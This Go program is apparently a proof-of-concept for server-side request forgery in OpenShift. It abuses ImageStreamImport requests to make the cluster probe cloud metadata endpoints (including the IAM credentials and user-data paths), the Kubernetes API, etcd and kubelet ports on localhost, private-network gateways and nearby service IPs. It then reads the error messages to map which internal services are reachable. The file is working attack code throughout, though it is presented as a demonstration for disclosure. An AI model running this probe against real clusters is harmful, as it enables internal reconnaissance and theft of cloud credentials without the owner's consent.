package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path"
	"strings"
	"sync"
	"time"

	imagev1 "github.com/openshift/api/image/v1"
	imageclient "github.com/openshift/client-go/image/clientset/versioned"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	"golang.org/x/time/rate"
)

type TestResult struct {
	TestName          string    `json:"test_name"`
	TargetAddress     string    `json:"target_address"`
	WasBlocked        bool      `json:"was_blocked"`
	BlockedBy         string    `json:"blocked_by,omitempty"`
	ErrorMessage      string    `json:"error_message,omitempty"`
	Timestamp         time.Time `json:"timestamp"`
	Severity          string    `json:"severity"`
	AttackVector      string    `json:"attack_vector"`
	ReachedAPIServer  bool      `json:"reached_api_server"`
	ImportStatus      string    `json:"import_status,omitempty"`
	ValidationStage   string    `json:"validation_stage"`
	NetworkAttempted  bool      `json:"network_attempted"`
	InformationLeaked []string  `json:"information_leaked,omitempty"`
	ResponseReceived  bool      `json:"response_received"`
	HTTPStatusCode    string    `json:"http_status_code,omitempty"`
}

type DemoReport struct {
	TestRunID    string       `json:"test_run_id"`
	ClusterInfo  ClusterInfo  `json:"cluster_info"`
	TestResults  []TestResult `json:"test_results"`
	Summary      TestSummary  `json:"summary"`
	SecurityGaps []string     `json:"security_gaps"`
	KeyFindings  []string     `json:"key_findings"`
	Timestamp    time.Time    `json:"timestamp"`
	Duration     string       `json:"duration"`
}

type ClusterInfo struct {
	Version          string   `json:"version"`
	Environment      string   `json:"environment"`
	Namespace        string   `json:"namespace"`
	ServiceNetwork   string   `json:"service_network"`
	InternalServices []string `json:"internal_services"`
}

type TestSummary struct {
	TotalTests              int `json:"total_tests"`
	ReachedAPIServer        int `json:"reached_api_server"`
	NetworkAttemptsDetected int `json:"network_attempts_detected"`
	HTTPResponsesReceived   int `json:"http_responses_received"`
	InformationLeaked       int `json:"information_leaked"`
	Critical                int `json:"critical_severity"`
	High                    int `json:"high_severity"`
}

type TestEndpoint struct {
	Name         string
	Address      string
	Port         int
	Path         string
	Severity     string
	AttackVector string
	ExpectedData string
}

type ConcurrentTester struct {
	imageClient *imageclient.Clientset
	namespace   string
	limiter     *rate.Limiter
	resultsMu   sync.Mutex
	results     []TestResult
	progressMu  sync.Mutex
	completed   int
	total       int
}

func main() {
	startTime := time.Now()

	kubeconfig := os.Getenv("KUBECONFIG")
	if kubeconfig == "" {
		kubeconfig = path.Join(os.Getenv("HOME"), ".kube", "config")
	}
	kubeconfig = strings.Trim(kubeconfig, "\"")

	config, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err != nil {
		log.Fatalf("Error building kubeconfig: %v", err)
	}

	imageClient, err := imageclient.NewForConfig(config)
	if err != nil {
		log.Fatalf("Error building openshift image client: %v", err)
	}

	k8sClient, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatalf("Error creating k8s client: %v", err)
	}

	namespace := "ssrf"
	ctx := context.Background()

	// Ensure namespace exists
	if _, err := k8sClient.CoreV1().Namespaces().Get(ctx, namespace, metav1.GetOptions{}); err != nil {
		ns := &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: namespace}}
		if _, err := k8sClient.CoreV1().Namespaces().Create(ctx, ns, metav1.CreateOptions{}); err != nil {
			log.Printf("Warning: Could not create namespace: %v", err)
		}
	}

	clusterInfo := getClusterInfo(ctx, k8sClient, namespace)

	fmt.Println("\n╔═════════════════════════════════════════════════════════════╗")
	fmt.Println("║   OpenShift SSRF Vulnerability Demonstration               ║")
	fmt.Println("║   Concurrent Testing Against 20+ Internal Endpoints        ║")
	fmt.Println("╚═════════════════════════════════════════════════════════════╝")
	fmt.Printf("\nCluster: OpenShift %s\n", clusterInfo.Version)
	fmt.Printf("Service Network: %s\n", clusterInfo.ServiceNetwork)
	fmt.Printf("Test Namespace: %s\n", namespace)

	endpoints := buildComprehensiveTestCases(clusterInfo)
	fmt.Printf("\nRunning %d tests concurrently (10 QPS rate limit)...\n\n", len(endpoints))

	// Create concurrent tester with rate limiting (10 requests per second)
	tester := &ConcurrentTester{
		imageClient: imageClient,
		namespace:   namespace,
		limiter:     rate.NewLimiter(10, 10),
		results:     make([]TestResult, 0, len(endpoints)),
		total:       len(endpoints),
	}

	// Run tests concurrently using WaitGroup.Go
	var wg sync.WaitGroup
	for _, endpoint := range endpoints {
		wg.Go(func() {
			tester.runTest(endpoint)
		})
	}

	// Wait for all tests to complete
	wg.Wait()

	duration := time.Since(startTime)

	// Build report
	report := DemoReport{
		TestRunID:   fmt.Sprint(time.Now().Unix()),
		ClusterInfo: clusterInfo,
		TestResults: tester.results,
		Timestamp:   time.Now(),
		Duration:    duration.String(),
	}

	report.Summary = calculateSummary(report.TestResults)
	report.KeyFindings = extractKeyFindings(report.TestResults)
	report.SecurityGaps = identifySecurityGaps(report.TestResults)

	displayFinalSummary(report)
	saveReport(report)

	fmt.Printf("\n⏱️  Total execution time: %s\n", duration.String())
}

func (ct *ConcurrentTester) runTest(endpoint TestEndpoint) {
	// Rate limiting
	ctx := context.Background()
	if err := ct.limiter.Wait(ctx); err != nil {
		log.Printf("Rate limiter error: %v", err)
		return
	}

	// Run the test
	result := testImageImportBlocking(ct.imageClient, ct.namespace, endpoint)

	// Thread-safe result storage
	ct.resultsMu.Lock()
	ct.results = append(ct.results, result)
	ct.resultsMu.Unlock()

	// Thread-safe progress update
	ct.progressMu.Lock()
	ct.completed++
	completed := ct.completed
	total := ct.total
	ct.progressMu.Unlock()

	// Display progress and interesting findings
	if len(result.InformationLeaked) > 0 || result.ResponseReceived {
		fmt.Printf("[%d/%d] 🔴 %s\n", completed, total, endpoint.Name)
		for _, leak := range result.InformationLeaked {
			fmt.Printf("        • %s\n", leak)
		}
	} else {
		fmt.Printf("[%d/%d] ✓ %s\n", completed, total, endpoint.Name)
	}
}

func getClusterInfo(ctx context.Context, k8sClient *kubernetes.Clientset, namespace string) ClusterInfo {
	info := ClusterInfo{
		Environment: "OpenShift Local (CRC)",
		Namespace:   namespace,
	}

	nodes, err := k8sClient.CoreV1().Nodes().List(ctx, metav1.ListOptions{Limit: 1})
	if err == nil && len(nodes.Items) > 0 {
		info.Version = nodes.Items[0].Status.NodeInfo.KubeletVersion
	}

	svc, err := k8sClient.CoreV1().Services("default").Get(ctx, "kubernetes", metav1.GetOptions{})
	if err == nil {
		info.ServiceNetwork = svc.Spec.ClusterIP
	}

	// Discover internal services
	services := []struct{ ns, name string }{
		{"default", "kubernetes"},
		{"openshift-apiserver", "api"},
		{"openshift-image-registry", "image-registry"},
		{"openshift-console", "console"},
		{"openshift-monitoring", "prometheus-k8s"},
	}

	for _, s := range services {
		if svc, err := k8sClient.CoreV1().Services(s.ns).Get(ctx, s.name, metav1.GetOptions{}); err == nil {
			info.InternalServices = append(info.InternalServices,
				fmt.Sprintf("%s.%s.svc:%d (%s)", s.name, s.ns, svc.Spec.Ports[0].Port, svc.Spec.ClusterIP))
		}
	}

	return info
}

func buildComprehensiveTestCases(info ClusterInfo) []TestEndpoint {
	serviceIP := info.ServiceNetwork

	return []TestEndpoint{
		// AWS Metadata - multiple attempts
		{"AWS Metadata - /latest/", "169.254.169.254", 80, "/latest/", "CRITICAL", "AWS metadata service root", "metadata endpoints list"},
		{"AWS Metadata - instance-identity", "169.254.169.254", 80, "/latest/dynamic/instance-identity/document", "CRITICAL", "AWS instance identity (account ID, region)", "JSON with accountId"},
		{"AWS Metadata - user-data", "169.254.169.254", 80, "/latest/user-data", "CRITICAL", "AWS user-data (may contain secrets)", "Bootstrap scripts"},
		{"AWS Metadata - credentials", "169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/", "CRITICAL", "IAM credentials", "AWS access keys"},

		// GCP Metadata
		{"GCP Metadata - /computeMetadata/v1/", "metadata.google.internal", 80, "/computeMetadata/v1/", "CRITICAL", "GCP metadata service", "Instance info"},
		{"GCP Metadata - project-id", "metadata.google.internal", 80, "/computeMetadata/v1/project/project-id", "CRITICAL", "GCP project ID", "Project identifier"},

		// Azure Metadata
		{"Azure Metadata - instance", "169.254.169.254", 80, "/metadata/instance", "CRITICAL", "Azure instance metadata", "VM information"},

		// Kubernetes API - multiple endpoints
		{"K8s API - /api", serviceIP, 443, "/api", "CRITICAL", "Kubernetes API discovery", "API versions"},
		{"K8s API - /apis", serviceIP, 443, "/apis", "CRITICAL", "Kubernetes API groups", "All API groups"},
		{"K8s API - /version", serviceIP, 443, "/version", "HIGH", "Kubernetes version disclosure", "Version info"},
		{"K8s API - /healthz", serviceIP, 443, "/healthz", "MEDIUM", "Health check endpoint", "Service status"},

		// Loopback - various ports
		{"Localhost - HTTP", "127.0.0.1", 80, "/", "HIGH", "Local HTTP services", "Web services"},
		{"Localhost - Alt HTTP", "127.0.0.1", 8080, "/", "HIGH", "Development services", "Debug interfaces"},
		{"Localhost - Metrics", "127.0.0.1", 9090, "/metrics", "HIGH", "Prometheus metrics", "Monitoring data"},
		{"Localhost - Etcd", "127.0.0.1", 2379, "/version", "CRITICAL", "Etcd database", "Cluster state"},
		{"Localhost - Kubelet", "127.0.0.1", 10250, "/metrics", "CRITICAL", "Kubelet API", "Node information"},

		// RFC1918 Private networks
		{"RFC1918 - 10.x gateway", "10.0.0.1", 80, "/", "HIGH", "Internal network gateway", "Router interface"},
		{"RFC1918 - 192.168.x gateway", "192.168.1.1", 80, "/", "HIGH", "Home/office router", "Router admin"},
		{"RFC1918 - 172.16.x gateway", "172.16.0.1", 80, "/", "HIGH", "Corporate network", "Internal infrastructure"},

		// Internal cluster IPs (from discovered services)
		{"Service Network Scan - +1", incrementIP(serviceIP), 443, "/", "HIGH", "Service network enumeration", "Adjacent services"},
		{"Service Network Scan - +10", incrementIP(serviceIP, 10), 443, "/", "HIGH", "Service network scanning", "Network topology"},
	}
}

func incrementIP(ip string, increments ...int) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ip
	}
	
	increment := 1
	if len(increments) > 0 {
		increment = increments[0]
	}
	
	// Simple increment of last octet
	var lastOctet int
	fmt.Sscanf(parts[3], "%d", &lastOctet)
	lastOctet += increment
	if lastOctet > 255 {
		lastOctet = 255
	}
	
	return fmt.Sprintf("%s.%s.%s.%d", parts[0], parts[1], parts[2], lastOctet)
}

func testImageImportBlocking(imageClient *imageclient.Clientset, namespace string, endpoint TestEndpoint) TestResult {
	ctx := context.Background()

	// Format as Docker registry reference
	address := fmt.Sprintf("%s:%d/v2", endpoint.Address, endpoint.Port)

	result := TestResult{
		TestName:          endpoint.Name,
		TargetAddress:     address,
		Severity:          endpoint.Severity,
		Timestamp:         time.Now(),
		AttackVector:      endpoint.AttackVector,
		InformationLeaked: []string{},
	}

	isi := &imagev1.ImageStreamImport{
		ObjectMeta: metav1.ObjectMeta{
			Name:      fmt.Sprintf("test-%d", time.Now().UnixNano()/1000000),
			Namespace: namespace,
		},
		Spec: imagev1.ImageStreamImportSpec{
			Import: true,
			Images: []imagev1.ImageImportSpec{
				{
					From: corev1.ObjectReference{
						Kind: "DockerImage",
						Name: address,
					},
					ImportPolicy: imagev1.TagImportPolicy{
						Insecure: true,
					},
				},
			},
		},
	}

	importResult, err := imageClient.ImageV1().ImageStreamImports(namespace).Create(ctx, isi, metav1.CreateOptions{})

	if err != nil {
		result.ReachedAPIServer = true
		result.ErrorMessage = err.Error()
		analyzeAdmissionError(&result, err.Error())
	} else {
		result.ReachedAPIServer = true
		if importResult != nil && len(importResult.Status.Images) > 0 {
			analyzeImportStatus(&result, importResult.Status.Images[0], endpoint)
		}
	}

	return result
}

func analyzeAdmissionError(result *TestResult, errMsg string) {
	errorLower := strings.ToLower(errMsg)

	if strings.Contains(errorLower, "invalid reference") {
		result.ValidationStage = "Client-side validation"
		result.ReachedAPIServer = false
	} else if strings.Contains(errorLower, "restricted") {
		result.ValidationStage = "RestrictedEndpointsAdmission"
		result.WasBlocked = true
		result.BlockedBy = "RestrictedEndpointsAdmission"
	} else {
		result.ValidationStage = "Unknown admission"
	}
}

func analyzeImportStatus(result *TestResult, imgStatus imagev1.ImageImportStatus, endpoint TestEndpoint) {
	statusMsg := imgStatus.Status.Message

	// Check for network activity
	if strings.Contains(statusMsg, "dial tcp") || strings.Contains(statusMsg, "Get \"http") {
		result.NetworkAttempted = true
		result.InformationLeaked = append(result.InformationLeaked,
			"Network connection attempted to "+endpoint.Address)
	}

	// Check for HTTP responses
	if strings.Contains(statusMsg, "403") {
		result.ResponseReceived = true
		result.HTTPStatusCode = "403 Forbidden"
		result.InformationLeaked = append(result.InformationLeaked,
			"HTTP 403 - Service exists and responding")
		if apiPath := extractAPIDetails(statusMsg); apiPath != "" {
			result.InformationLeaked = append(result.InformationLeaked, "Revealed: "+apiPath)
		}
	}

	if strings.Contains(statusMsg, "401") {
		result.ResponseReceived = true
		result.HTTPStatusCode = "401 Unauthorized"
		result.InformationLeaked = append(result.InformationLeaked,
			"HTTP 401 - Authentication required (service active)")
	}

	if strings.Contains(statusMsg, "404") {
		result.ResponseReceived = true
		result.HTTPStatusCode = "404 Not Found"
		result.InformationLeaked = append(result.InformationLeaked,
			"HTTP 404 - Service responded")
	}

	if strings.Contains(statusMsg, "connection refused") {
		result.NetworkAttempted = true
		result.InformationLeaked = append(result.InformationLeaked,
			"Connection refused - Port closed but IP reachable")
	}

	if strings.Contains(statusMsg, "timeout") || strings.Contains(statusMsg, "deadline exceeded") {
		result.NetworkAttempted = true
		result.InformationLeaked = append(result.InformationLeaked,
			"Timeout - Network path exists")
	}

	result.ErrorMessage = statusMsg
	result.ImportStatus = "FAILED"
	result.ValidationStage = "Network attempt"
}

func extractAPIDetails(msg string) string {
	if strings.Contains(msg, "cannot get path") {
		start := strings.Index(msg, "path \\\"")
		if start > 0 {
			end := strings.Index(msg[start+7:], "\\\"")
			if end > 0 {
				return "API path: " + msg[start+7:start+7+end]
			}
		}
	}
	return ""
}

func displayFinalSummary(report DemoReport) {
	fmt.Println("\n╔═════════════════════════════════════════════════════════════╗")
	fmt.Println("║                   VULNERABILITY REPORT                      ║")
	fmt.Println("╚═════════════════════════════════════════════════════════════╝\n")

	fmt.Printf("Tests Executed:           %d\n", report.Summary.TotalTests)
	fmt.Printf("Reached API Server:       %d\n", report.Summary.ReachedAPIServer)
	fmt.Printf("Network Attempts:         %d\n", report.Summary.NetworkAttemptsDetected)
	fmt.Printf("HTTP Responses Received:  %d\n", report.Summary.HTTPResponsesReceived)
	fmt.Printf("Information Leaked:       %d tests\n\n", report.Summary.InformationLeaked)

	if len(report.KeyFindings) > 0 {
		fmt.Println("🔴 KEY FINDINGS:")
		for i, finding := range report.KeyFindings {
			fmt.Printf("  %d. %s\n", i+1, finding)
		}
		fmt.Println()
	}

	fmt.Println("⚠️  SECURITY GAPS IDENTIFIED:")
	for _, gap := range report.SecurityGaps {
		fmt.Printf("  • %s\n", gap)
	}

	fmt.Println("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("EVIDENCE FOR YOUR MANAGER:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("✓ %d tests reached OpenShift API server\n", report.Summary.ReachedAPIServer)
	fmt.Printf("✓ %d network connections attempted to dangerous addresses\n", report.Summary.NetworkAttemptsDetected)
	fmt.Printf("✓ %d HTTP responses received from internal services\n", report.Summary.HTTPResponsesReceived)
	fmt.Printf("✓ %d tests leaked information about infrastructure\n", report.Summary.InformationLeaked)
	fmt.Println("\nThis proves OpenShift does NOT validate destinations before")
	fmt.Println("making network requests, creating an SSRF vulnerability.")
}

func calculateSummary(results []TestResult) TestSummary {
	summary := TestSummary{
		TotalTests: len(results),
	}

	for _, r := range results {
		if r.ReachedAPIServer {
			summary.ReachedAPIServer++
		}
		if r.NetworkAttempted {
			summary.NetworkAttemptsDetected++
		}
		if r.ResponseReceived {
			summary.HTTPResponsesReceived++
		}
		if len(r.InformationLeaked) > 0 {
			summary.InformationLeaked++
		}
		if r.Severity == "CRITICAL" {
			summary.Critical++
		} else if r.Severity == "HIGH" {
			summary.High++
		}
	}

	return summary
}

func extractKeyFindings(results []TestResult) []string {
	var findings []string

	for _, r := range results {
		if r.ResponseReceived && r.HTTPStatusCode != "" {
			findings = append(findings, fmt.Sprintf("%s: %s",
				r.TestName, r.HTTPStatusCode))
		}
	}

	return findings
}

func identifySecurityGaps(results []TestResult) []string {
	return []string{
		"No pre-connection IP validation - all addresses attempted",
		"No blocking of RFC1918 private networks",
		"No blocking of link-local addresses (169.254.0.0/16)",
		"No blocking of loopback (127.0.0.1)",
		"Service network IPs not protected",
		"HTTP responses leak service existence and API structure",
	}
}

func saveReport(report DemoReport) {
	filename := fmt.Sprintf("ssrf-vuln-report-%s.json", time.Now().Format("2006-01-02-150405"))
	data, _ := json.MarshalIndent(report, "", "  ")
	os.WriteFile(filename, data, 0644)
	fmt.Printf("\n📄 Detailed report: %s\n", filename)
}